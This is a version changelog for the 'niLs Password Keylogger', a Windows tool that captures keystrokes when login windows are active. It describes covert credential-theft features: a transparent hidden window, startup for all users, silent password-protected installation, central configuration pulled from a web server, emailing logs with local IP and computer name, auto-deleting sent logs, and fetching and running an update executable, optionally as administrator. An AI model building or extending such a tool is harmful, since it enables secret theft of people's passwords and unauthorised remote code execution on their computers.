Project : niLs Password Keylogger
	Concept : Records Keylog only when certain windows are active. Say, login windows
		Program identifies active window by its title.
Revision:1.2.0
Date: 01/03/2014
Updates:
1. If PubIPURL="none" then PublicIP is not downloaded.
2. Update Package:
	Create file named "https://sites.google.com/site/nilsklg/" & CompID & ".txt"
		NewVersion,"URL to Update.exe"
	Program Will Check if New Version Available and Run Update.exe
3. If filename in URL ends with - it will run as administrator. else limited user.


Revision 1.0.20
Date : 26/02/2014
>Objectives:
It should work with all Windows 7,8, XP 
Admin user,limited user should run klg at startup(shared keylogger)
titles,settings should be easily centrally managed from web server or LAN server
>Changes:
1. 7-zip used for packaging
2. titles stored in C:\ProgramData\System\titles.txt
3. settings stored in C:\ProgramData\System\settings.txt
4. removed - Encrypt Log with password
5. Sends Local IP,ComputerName in Log details
6. Mail will not have attachment but only body.
7. Any no. of titles can be added.
8. If titles.txt not found continues with Logging all windows
9. If settings.txt not found default settings used.
10. settings.txt:
	"Log_Path(C:\Users\Public\Libraries\NLogs)","Email_To(none)","Email_From","Email_Password","http address to get Public IP"
11. Prefix CompName with * Will enable AutoDeleteSentLogs
_12. 7 zip password protected setup will be used with EULA/ silent installtion
_14. titles.txt/settings.txt will be downloaded from web
_15. Change settings.txt and titles.txt file location to C:\ProgramData so as limited user can change the settings

Revision 1.0.9
Date:17/10/2012 4:30PM
Changes:
1.Transparenting form with API function.
2.Removed small size frm placed at screen bottom.
3.Password Protected Package.zip with pwd = 10.